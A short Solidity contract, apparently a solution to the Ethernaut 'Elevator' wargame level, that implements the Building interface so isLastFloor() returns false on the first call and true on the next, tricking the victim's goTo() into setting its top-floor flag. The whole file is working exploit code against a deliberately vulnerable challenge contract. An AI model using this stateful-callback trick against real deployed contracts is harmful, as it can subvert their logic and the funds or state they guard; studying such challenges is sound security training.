// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract ElevatorExploit is Building {
    address public victimContract;
    uint public numberOfCalls = 0;

    constructor(address payable _victimContract) public payable {
        victimContract = _victimContract;
    }

    function pwn() public {
        (bool success, bytes memory data) = victimContract.call{gas: 3000000}(
            abi.encodeWithSignature("goTo(uint256)", 1)
        );
        require(success);
    }

    function isLastFloor(uint _floor) override external returns (bool) {
        numberOfCalls++;
        // This will return false on the first call in Elevator.goTo(uint) and true on the second call.
        return numberOfCalls % 2 == 0;
    }

}